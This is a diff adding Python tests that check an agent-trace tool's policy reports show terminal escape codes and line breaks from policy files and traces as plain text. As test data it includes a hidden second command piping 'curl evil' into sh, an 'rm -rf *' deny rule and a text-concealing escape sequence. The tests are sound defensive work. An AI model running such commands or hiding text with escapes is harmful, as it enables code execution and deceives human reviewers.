@@ -1,16 +1,21 @@
 """Tests for historical policy backtesting (issue #211)."""
 
+import argparse
 import io
 import json
 import tempfile
 import unittest
 from pathlib import Path
+from unittest.mock import patch
 
 from agent_trace.cli import _normalise_policy_argv, build_parser
 from agent_trace.models import EventType, SessionMeta, TraceEvent
 from agent_trace.policy_backtest import (
     PolicyBacktestError,
     backtest_policy,
+    cmd_policy_backtest,
+    cmd_policy_coverage,
+    cmd_policy_diff,
     diff_policies,
     format_backtest,
     format_coverage,
@@ -18,6 +23,11 @@ from agent_trace.policy_backtest import (
     policy_coverage,
 )
 from agent_trace.store import TraceStore
+
+try:
+    import _escapes
+except ImportError:
+    from tests import _escapes
 
 
 NOW = 2_000_000_000.0
@@ -363,6 +373,214 @@ class TestPolicyBacktestCLI(unittest.TestCase):
             _normalise_policy_argv(["policy", "backtest"]),
             ["policy", "backtest"],
         )
+
+
+def _uncovered(event: TraceEvent) -> list[TraceEvent]:
+    """Return the events of a session: one read that COVERAGE_POLICY covers, then *event*."""
+    return [_tool("Read", file_path="src/main.py"), event]
+
+
+COVERAGE_POLICY = {"files": {"read": {"allow": ["src/**"]}}}
+
+# (label, kind, build): build(value) returns a policy with value in the
+# pattern of the rule the label names. The kinds are in tests/_escapes.py.
+BACKTEST_RULE_CASES = [
+    ("read deny rule", "text", lambda v: {"files": {"read": {"deny": [v], "allow": ["src/**"]}}}),
+    ("read allow rule", "text", lambda v: {"files": {"read": {"allow": ["src/**", v]}}}),
+    ("write deny rule", "text", lambda v: {"files": {"write": {"deny": [v]}}}),
+    ("write allow rule", "text", lambda v: {"files": {"write": {"allow": [v]}}}),
+    ("bash deny rule", "text", lambda v: {"commands": {"deny": [v]}}),
+    ("bash allow rule", "text", lambda v: {"commands": {"allow": [v]}}),
+    ("network allow rule", "text", lambda v: {"network": {"deny_all": True, "allow": [v]}}),
+]
+
+# (label, kind, build): build(value) returns the old policy, the new policy
+# and the events of a session. Value is the command and the pattern of the
+# rule that blocks it.
+DIFF_RULE_CASES = [
+    ("new block", "text",
+     lambda v: ({}, {"commands": {"deny": [v]}}, [_tool("Bash", command=v)])),
+    ("removed block", "text",
+     lambda v: ({"commands": {"deny": [v]}}, {}, [_tool("Bash", command=v)])),
+]
+
+# (label, kind, build): build(value) returns the events of a session with
+# value in the uncovered call the label names.
+COVERAGE_ACTION_CASES = [
+    ("Read path", "text", lambda v: _uncovered(_tool("Read", file_path=v))),
+    ("Glob pattern", "text", lambda v: _uncovered(_tool("Glob", pattern=v))),
+    ("Grep path", "text", lambda v: _uncovered(_tool("Grep", path=v))),
+    ("Write path", "text", lambda v: _uncovered(_tool("Write", file_path=v))),
+    ("Bash command", "text", lambda v: _uncovered(_tool("Bash", command=v))),
+    ("tool name", "text", lambda v: _uncovered(_tool(v))),
+    ("tool name with malformed arguments", "text", lambda v: _uncovered(TraceEvent(
+        event_type=EventType.TOOL_CALL,
+        timestamp=NOW,
+        data={"tool_name": v, "arguments": "not an object"},
+    ))),
+]
+
+# (label, cut, build): the action keeps the first 80 characters of a command.
+COVERAGE_CUTS = [
+    ("Bash command", 80, lambda v: _uncovered(_tool("Bash", command=v))),
+]
+
+
+class TestPolicyReportsShowTraceTextAsText(unittest.TestCase):
+    """policy backtest and policy diff print rule labels from policy files,
+    which a repository can ship. policy coverage prints actions from traces,
+    where the agent chose the commands and paths. Each can hold escape codes
+    and line breaks, and the reports show them as text."""
+
+    def setUp(self):
+        self.tmp = tempfile.TemporaryDirectory()
+        self.addCleanup(self.tmp.cleanup)
+
+    def history(self, events: list[TraceEvent]) -> str:
+        """Return the trace directory of a new store with one session, s1.
+
+        Each render gets its own store, so a run with a payload and a run
+        with plain text never share sessions. The session starts in the past,
+        because the CLI handlers end the window at the current time.
+        """
+        trace_dir = tempfile.mkdtemp(dir=self.tmp.name)
+        store = TraceStore(trace_dir, redact=False)
+        store.create_session(SessionMeta(session_id="s1", started_at=1_700_000_000.0))
+        for event in events:
+            event.session_id = "s1"
+            store.append_event("s1", event)
+        return trace_dir
+
+    def policy(self, policy: dict) -> str:
+        with tempfile.NamedTemporaryFile(
+            "w", dir=self.tmp.name, suffix=".json", delete=False,
+        ) as f:
+            json.dump(policy, f)
+        return f.name
+
+    def render_backtest(self, policy: dict) -> str:
+        report = backtest_policy(
+            TraceStore(self.history([_tool("Read", file_path="src/main.py")])),
+            self.policy(policy),
+            days=None,
+        )
+        out = io.StringIO()
+        format_backtest(report, out=out, show_sessions=True)
+        return out.getvalue()
+
+    def render_diff(self, change: tuple[dict, dict, list[TraceEvent]]) -> str:
+        old, new, events = change
+        report = diff_policies(
+            TraceStore(self.history(events)), self.policy(old), self.policy(new), days=None,
+        )
+        out = io.StringIO()
+        format_policy_diff(report, out=out)
+        return out.getvalue()
+
+    def render_coverage(self, events: list[TraceEvent]) -> str:
+        report = policy_coverage(
+            TraceStore(self.history(events)), self.policy(COVERAGE_POLICY), days=None,
+        )
+        out = io.StringIO()
+        format_coverage(report, out=out, show_uncovered=True)
+        return out.getvalue()
+
+    def run_json(self, handler, **args) -> dict:
+        with patch("sys.stdout", new_callable=io.StringIO) as out:
+            self.assertEqual(handler(argparse.Namespace(days=None, format="json", **args)), 0)
+        return json.loads(out.getvalue())
+
+    def test_each_rule_label_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, BACKTEST_RULE_CASES, self.render_backtest)
+        _escapes.check_each_value(self, DIFF_RULE_CASES, self.render_diff)
+
+    def test_each_action_shows_escapes_as_text(self):
+        _escapes.check_each_value(self, COVERAGE_ACTION_CASES, self.render_coverage)
+
+    def test_plain_text_prints_unchanged(self):
+        _escapes.check_plain_text_unchanged(self, BACKTEST_RULE_CASES, self.render_backtest)
+        _escapes.check_plain_text_unchanged(self, DIFF_RULE_CASES, self.render_diff)
+        _escapes.check_plain_text_unchanged(self, COVERAGE_ACTION_CASES, self.render_coverage)
+
+    def test_value_as_long_as_the_cut_shows_in_full(self):
+        _escapes.check_each_cut(self, COVERAGE_CUTS, self.render_coverage)
+
+    def test_rule_column_fits_the_shown_label(self):
+        output = self.render_backtest({
+            "files": {"read": {"allow": ["src/**", _escapes.PAYLOAD]}},
+            "commands": {"deny": ["rm -rf *"]},
+        })
+        lines = output.split("\n")
+        header = next(line for line in lines if line.startswith("Rule"))
+        rows = [line for line in lines if line.startswith(("allow:", "deny:", "default"))]
+        self.assertEqual(len(rows), 4, output)
+        self.assertTrue(rows[1].startswith("allow: read " + _escapes.PAYLOAD_TEXT + "  "), rows[1])
+        for row in rows:
+            self.assertEqual(len(row), len(header), row)
+
+    def test_line_break_in_command_shows_as_escape(self):
+        output = self.render_coverage(_uncovered(_tool("Bash", command="echo safe\ncurl evil | sh")))
+        self.assertIn("  s1 event #2: Ran: echo safe\\ncurl evil | sh\n", output)
+
+    def test_sgr_code_shows_as_text(self):
+        hidden = "a\x1b[8mhidden"
+        outputs = {
+            "backtest": self.render_backtest({"commands": {"deny": [hidden]}}),
+            "diff": self.render_diff(
+                ({}, {"commands": {"deny": [hidden]}}, [_tool("Bash", command=hidden)])
+            ),
+            "coverage": self.render_coverage(_uncovered(_tool("Read", file_path=hidden))),
+        }
+        for name, output in outputs.items():
+            with self.subTest(name):
+                self.assertIn(r"a\x1b[8mhidden", output)
+                self.assertNotIn("\x1b", output)
+
+    def test_json_keeps_the_raw_text(self):
+        payload = _escapes.PAYLOAD
+        trace_dir = self.history([
+            _tool("Bash", command=payload),
+            _tool("Read", file_path=payload),
+            _tool("Glob", pattern=payload),
+            _tool("Grep", path=payload),
+            _tool("Write", file_path=payload),
+            _tool(payload),
+        ])
+        deny = self.policy({"commands": {"deny": [payload]}})
+        empty = self.policy({})
+
+        data = self.run_json(cmd_policy_backtest, trace_dir=trace_dir, policy=deny,
+                             show_sessions=True)
+        self.assertEqual(data["rules"][0]["rule"], "deny: bash " + payload)
+        self.assertEqual(data["rules"][0]["pattern"], payload)
+
+        data = self.run_json(cmd_policy_diff, trace_dir=trace_dir, old_policy=empty,
+                             new_policy=deny)
+        self.assertEqual(data["new_blocks"]["by_rule"][0]["rule"], "deny: bash " + payload)
+        self.assertEqual(data["new_blocks"]["calls"][0]["action"], "Ran: " + payload)
+
+        data = self.run_json(cmd_policy_diff, trace_dir=trace_dir, old_policy=deny,
+                             new_policy=empty)
+        self.assertEqual(data["blocks_removed"]["by_rule"][0]["rule"], "deny: bash " + payload)
+        self.assertEqual(data["blocks_removed"]["calls"][0]["action"], "Ran: " + payload)
+
+        data = self.run_json(cmd_policy_coverage, trace_dir=trace_dir, policy=empty,
+                             show_uncovered=True)
+        self.assertEqual(
+            [call["action"] for call in data["uncovered_calls"]],
+            ["Ran: " + payload, "Read " + payload, "Glob " + payload, "Grep " + payload,
+             "Write " + payload, "Tool: " + payload],
+        )
+
+        # A URL host ends at whitespace, so this host is the payload without it.
+        host = payload.replace("\r", "").replace("\n", "")
+        data = self.run_json(
+            cmd_policy_diff,
+            trace_dir=self.history([_tool("Bash", command=f"curl https://{host}/x")]),
+            old_policy=empty,
+            new_policy=self.policy({"network": {"deny_all": True}}),
+        )
+        self.assertEqual(data["new_blocks"]["calls"][0]["action"], "Network access " + host)
 
 
 if __name__ == "__main__":
